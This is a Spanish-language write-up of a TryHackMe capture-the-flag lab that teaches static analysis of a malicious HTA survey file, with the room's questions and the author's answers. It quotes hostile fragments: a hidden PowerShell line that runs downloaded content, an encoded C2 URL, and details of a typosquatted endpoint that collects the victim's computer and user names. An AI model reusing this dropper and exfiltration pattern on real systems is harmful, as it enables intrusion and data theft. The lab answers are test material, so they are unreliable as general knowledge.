
Introduction

![[Pasted image 20251221160342.png]]

Y en nuestro reino de Wareville, al igual que en otros, miles de archivos de todo tipo pasan por los sistemas a diario: desde DOCX y currículums en PDF que reciben nuestros elfos, hasta hojas de cálculo financieras, archivos CSV del departamento de contabilidad y archivos ejecutables que ejecutan diferentes aplicaciones. Pero ¿te has preguntado alguna vez cuáles de estos podrían ser maliciosos? ¿Cuáles podrían pertenecer realmente al Rey Malhare? Una pregunta interesante, ¿verdad?

Objetivos de aprendizaje
En esta tarea, el equipo SOC de TBFC investigará un tipo de archivo específico: el formato HTA, un tipo que se usa a menudo con fines legítimos, pero que también es explotado por atacantes. Tu misión es aplicar ingeniería inversa al HTA y descubrir cómo el Rey Malhare engañó a los elfos de Wareville. Para ello, tendrás que buscar:

Metadatos de la aplicación
Funciones de script
Llamadas de red o datos codificados
Pistas sobre exfiltración

¡Importante!: Esta sala usa un archivo de malware HTA. Es seguro, pero no lo ejecute localmente. Por seguridad y para la experiencia deseada, debería usar AttackBox; el archivo ya está incluido. Si lo descarga manualmente, los navegadores podrían bloquearlo. Si se descarga, ábralo solo con un editor de texto y no lo ejecute.

Answer the questions below

My AttackBox has started and I am ready to learn about malware analysis.

No answer needed


---

# ==Malware Analysis==

## HTA (HTML Application) Overview

No hace mucho, en el verano de 2025, investigadores descubrieron que grupos de ransomware utilizaban archivos HTA camuflados en páginas de verificación falsas para propagar el ransomware [Epsilon Red](https://www.cloudsek.com/blog/threat-actors-lure-victims-into-downloading-hta-files-using-clickfix-to-spread-epsilon-red-ransomware). Durante esa campaña, muchas organizaciones se vieron afectadas y los equipos de seguridad recordaron la importancia de comprender qué son los archivos HTA y por qué aparecen con tanta frecuencia en entornos corporativos.

Entonces, ¿qué son exactamente los archivos HTA y por qué existen? En el mundo digital de Wareville, no todos los archivos de aspecto extraño representan una amenaza. Algunos se crearon originalmente para facilitar el trabajo diario de desarrolladores y administradores. Una de estas innovaciones útiles es el archivo HTA, abreviatura de HTML Application (Aplicación HTML). Un archivo HTA es como una pequeña aplicación de escritorio creada con tecnologías web conocidas como HTML, CSS y JavaScript. A diferencia de las páginas web normales que se abren dentro de un navegador, los archivos HTA se ejecutan directamente en Windows a través de un componente integrado llamado Microsoft HTML Application Host (proceso mshta.exe). Esto les permite verse y comportarse como programas ligeros con sus propias interfaces y acciones. En casos de uso legítimos, los archivos HTA cumplen diversas funciones prácticas en Wareville y otros lugares:

- Automatizar tareas administrativas o de configuración.
- Proporcionar interfaces rápidas para scripts internos.
- Probar pequeños prototipos sin crear software completo.
- Ofrecer utilidades ligeras de soporte de TI para el uso diario.

En resumen, los archivos HTA se diseñaron como una forma práctica de combinar la simplicidad de la web con la potencia de las aplicaciones de escritorio, una herramienta que muchos ingenieros y elfos de TBFC aún utilizan para mantener el buen funcionamiento de las operaciones de SOC-mas.

## Estructura del archivo HTA

Antes de que los defensores de TBFC puedan reconocer archivos HTA sospechosos, es importante comprender cómo se crea un archivo HTA normal. Afortunadamente, su estructura es bastante simple; de ​​hecho, es muy similar a una página HTML normal. Un archivo HTA suele contener tres partes principales:

- **La declaración HTA:** Define el archivo como una aplicación HTML y puede incluir propiedades básicas como el título, el tamaño de la ventana y el comportamiento. 
- **La interfaz (HTML y CSS):** Esta sección crea el diseño y los elementos visuales, como botones, formularios o texto.
- **El script (VBScript o JavaScript):** Aquí reside la lógica; define las acciones que realizará el HTA al abrirse o al interactuar con él.

A continuación, se muestra un ejemplo sencillo de cómo podría verse un archivo HTA legítimo:

![[Pasted image 20251221160643.png]]

Este pequeño ejemplo crea una ventana de escritorio sencilla con un botón que muestra un mensaje al hacer clic. En la práctica, los scripts HTA pueden ser mucho más largos y realizar tareas importantes. Es fácil entender por qué a los desarrolladores les gustaba HTA: se podía crear una herramienta rápida y funcional usando solo código web. Sin embargo, como pronto descubrirán los defensores de TBFC, la misma flexibilidad que hace que HTA sea conveniente también lo hace lo suficientemente potente como para requerir una atención minuciosa.

## Cómo King Malhare convierte los HTA en armas

Los archivos HTA son atractivos porque combinan el marcado web habitual con la ejecución de scripts en Windows. En manos de un defensor, son una práctica herramienta de automatización; en manos de alguien que busca eludir los controles, pueden usarse como mecanismo de entrega o lanzador.

**Fines comunes del uso malicioso de HTA:**

- **Acceso/entrega inicial:** Los archivos HTA suelen entregarse mediante phishing (archivos adjuntos de correo electrónico, páginas web falsas o descargas) y se ejecutan a través de ``mshta.exe``. 
- **Descargadores/droppers:** Un HTA puede ejecutar un script que recupera binarios o scripts adicionales del C2 del atacante.
- **Ofuscación/evasión:** Los HTA pueden ocultar sus intenciones incrustando datos codificados (Base64), usando fragmentos cortos de VBScript/JScript o iniciando procesos con ventanas ocultas.
- **Uso desatendido:** Los HTA suelen recurrir a herramientas integradas de Windows (mshta.exe, powershell.exe, wscript.exe, rundll32.exe) para evitar añadir nuevos binarios al disco.

Dentro de un HTA, a menudo se encuentra un pequeño script que puede estar ofuscado o codificado. En la práctica, este pequeño script suele realizar una de dos cosas: descargar y ejecutar una carga útil de segunda etapa o abrir un canal de control remoto para que otra cosa se comunique con el servidor del atacante. Estos scripts ligeros son la razón por la que los HTA son lanzadores eficaces: un solo archivo pequeño puede extraer el resto del malware.

He aquí un ejemplo que el Rey Malhare podría intentar utilizar:

![[Pasted image 20251221160809.png]]

Como puede ver, esta HTA es muy diferente del ejemplo simple que proporcionamos anteriormente; contiene varios elementos poco claros que merecen un análisis más detallado. Analicémoslo.

Al analizar las HTA, las etiquetas ``<title>`` y ``HTA:APPLICATION`` suelen revelar cómo los atacantes camuflan aplicaciones maliciosas. Pueden usar un nombre convincente como "Encuesta de Salarios" o "Herramienta Interna" para parecer seguras; siempre verifique esto primero.

En segundo lugar, hay un bloque de VBScript marcado con ``</script language="VBScript">`` que es la parte activa del archivo donde los atacantes suelen incrustar comandos codificados o llamar a recursos externos. Dentro de este bloque encontramos un comando de PowerShell ``b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command``, un patrón común en HTA maliciosos utilizados para la entrega o el lanzamiento. La invocación de PowerShell contiene un blob codificado en Base64, ``FromBase64String``. Probablemente sea un puntero a instrucciones adicionales o a una carga útil descargada. Si ve una cadena codificada, asuma que oculta una URL. Al decodificarla, se revela la dirección de comando y control (C2) del atacante o un recurso utilizado en el ataque. Siempre decodifique antes de asumir su función.

Los autores de malware suelen utilizar múltiples capas de codificación y cifrado, como Base64, para la ofuscación, como una forma de cifrado o cifrado para ocultar la verdadera carga útil. Al decodificar Base64, compruebe si la salida sigue siendo ininteligible; de ​​ser así, se requiere un segundo paso de descifrado.

Para el análisis, extraeremos ese código Base64: ``aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0`` e inspecciónelo con una herramienta como [CyberChef](https://gchq.github.io/CyberChef/) para revelar lo que esconde.

![[Pasted image 20251221160948.png]]

Nota: En el ejemplo, hemos censurado el recurso remoto y reemplazado el enlace real con el archivo REDACTED.txt por seguridad. En un incidente real, esa cadena normalmente apuntaría directamente a un archivo alojado en el dominio C2 del atacante (por ejemplo, una URL bajo king-malhare[.]com en nuestro caso de SOC-mas).

Después del comando codificado de PowerShell, podemos ver tres variables clave: $U, $C y $B. Analicemos rápidamente la función de cada una:

- **$U:** Almacena la URL decodificada, la ubicación desde donde se obtendrá el siguiente script o carga útil.
- **$C:** Almacena el contenido descargado de esa URL, generalmente un script de PowerShell o instrucciones de texto.
- **$B:** Convierte ese contenido en un bloque de script ejecutable y lo ejecuta directamente en memoria.

Siempre que vea una cadena de variables como esta, intente rastrear dónde se crea, se usa y se pasa cada una. Si una variable termina dentro de una función como Run, Execute o Eval, es señal de que se están ejecutando datos descargados, un indicador clave de actividad maliciosa.

En resumen, el proceso para revisar una HTA sospechosa se puede dividir en tres pasos principales:

1. Identificar la sección de scripts (VBScript).
2. Buscar datos codificados o conexiones externas (p. ej., Base64, solicitudes HTTP).
3. Seguir la lógica para ver qué se está ejecutando o enviando.

Revisamos cómo los atacantes podrían usar un archivo HTA con fines maliciosos. Ahora que has visto cómo las HTA pueden combinar HTML, VBScript y PowerShell, aplicarás el mismo proceso para analizar una HTA sospechosa. Empieza por localizar las secciones de scripts (``<script language="VBScript">``), luego identifica las funciones, las cadenas codificadas y cualquier referencia a URL o llamadas del sistema. Decodifica cualquier cosa que parezca ocultar información y luego rastrea cómo el script usa los resultados. Ahora te toca a ti averiguar qué hicieron los secuaces del rey malvado.

## De encuestas a fallos de seguridad

Nuestro equipo descubrió que las computadoras portátiles de algunos elfos estaban comprometidas. Tras analizar el incidente, parece que el denominador común entre todos ellos es una encuesta que completaron sobre sus salarios. La investigación descubrió que se envió un correo electrónico a estos elfos con un archivo adjunto de HTA. El equipo les solicita que revisen el archivo de HTA y nos den su opinión sobre su funcionamiento. Pueden usar AttackBox y buscar el archivo aquí ``/root/Rooms/AoC2025/Day21/survey.hta`` o descargar el archivo de tarea adjunto y realizar su análisis.

Usen un editor de texto para ver el HTA y asegurarse de que no se ejecute. Pueden usar pluma en AttackBox ejecutando el siguiente comando:

``pluma /root/Rooms/AoC2025/Day21/survey.hta``

Verán el HTA de la siguiente manera:

![[Pasted image 20251221161156.png]]

Comenzaremos nuestro análisis buscando los metadatos de la HTA, que nos indicarán el propósito que les comunica a los usuarios. Esta sección se identifica con el ``<head>``, como se muestra a continuación:

![[Pasted image 20251221172141.png]]

A continuación, queremos comprender qué hace realmente la HTA. Esto significa que debemos buscar definiciones de funciones en la sección de VBScript (``<script type="text/vbscript">``), es decir, buscar líneas que comiencen con "Function" o "Sub". En nuestra HTA, podemos ver cinco funciones:

- **window_onLoad:** Esta función se ejecutará automáticamente cuando la HTA cargue y ejecute la función ``getQuestions()``.
- **getQuestions():** Esta función realiza solicitudes externas y, finalmente, ejecuta la función ``decodeBase64`` e invoca la función ``provideFeedback`` con los datos.
- **providerFeedback(feedbackString):** Esta función recopila datos sobre el ordenador, realiza solicitudes externas y, finalmente, ejecuta algo que aún necesitamos analizar.
- **decodeBase64(base64):** Esta función toma una cadena base64 y la convierte a binario.
- **RSBinaryToString(xBinary)**: Esta función toma una entrada binaria y la convierte de nuevo a una cadena. 

Dentro de estas funciones, queremos comprender las acciones reales que se realizan. Estas suelen estar representadas por ``CreateObject()``, y nuestra aplicación contiene un par de ellas, como:

- **InternetExplorer.Application:** Permite que la aplicación establezca una conexión externa.
- **WScript.Network:** Se conecta a los elementos de red WScript del ordenador para obtener información.
- **WScript.Shell:** Crea un shell WScript que permite ejecutar comandos en el ordenador.

Por último, queremos comprender cómo se ve realmente la HTA para el usuario. En este caso, es muy similar a los archivos HTML. Para ello, debemos examinar la parte ``<body>`` de la HTA a partir de la línea 169. Esta es la parte que se mostrará al usuario.

Con la información y los pasos descritos anteriormente, es hora de analizar esta HTA y descubrir qué está tramando el Rey Malhare.

**Answer the questions below**

What is the title of the HTA application?

Respuesta: Best Festival Company Developer Survey
![[Pasted image 20251221180348.png]]

What VBScript function is acting as if it is downloading the survey questions?

Respuesta: getQuestions
![[Pasted image 20251221180716.png]]

What URL domain (including sub-domain) is the "questions" being downloaded from?

Respuesta: survey.bestfestiivalcompany.com
![[Pasted image 20251221180818.png]]

Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?

Respuesta: i
![[Pasted image 20251221181954.png]]

Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?

Respuesta: 4
![[Pasted image 20251221182109.png]]

Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?

Respuesta: South Pole
![[Pasted image 20251221182254.png]]

The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.

Respuesta:  ComputerName,UserName
![[Pasted image 20251221182510.png]]

What endpoint is the enumerated data being exfiltrated to?

Respuesta: /details
![[Pasted image 20251221182709.png]]

What HTTP method is being used to exfiltrate the data?

Respuesta: GET
![[Pasted image 20251221185339.png]]

After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?

Respuesta: runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
![[Pasted image 20251221184311.png]]

It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from [here](https://assets.tryhackme.com/additional/aoc2025/files/blob.txt). What popular encoding scheme was used in an attempt to obfuscate the download?

Respuesta: base64
![[Pasted image 20251221184553.png]]
![[Pasted image 20251221184603.png]]

Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?

Respuesta: ROT13
![[Pasted image 20251221185400.png]]

Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?

Respuesta: 
![[Pasted image 20251221185544.png]]

For those who want another challenge, download the HTA file from [here](https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip) to get the key for **Side Quest 4**, accessible through our [Side Quest Hub](https://tryhackme.com/adventofcyber25/sidequest). The password for the file is `CanYouREM3?`.

No answer needed

If you enjoyed today's room, you may also like the [MalDoc: Static Analysis](https://tryhackme.com/room/maldoc) room.

No answer needed


![[Pasted image 20251221175843.png]]
![[Pasted image 20251221175853.png]]
![[Pasted image 20251221175946.png]]
![[Pasted image 20251221180058.png]]
![[Pasted image 20251221180120.png]]
![[Pasted image 20251221180156.png]]
![[Pasted image 20251221180238.png]]
![[Pasted image 20251221180309.png]]


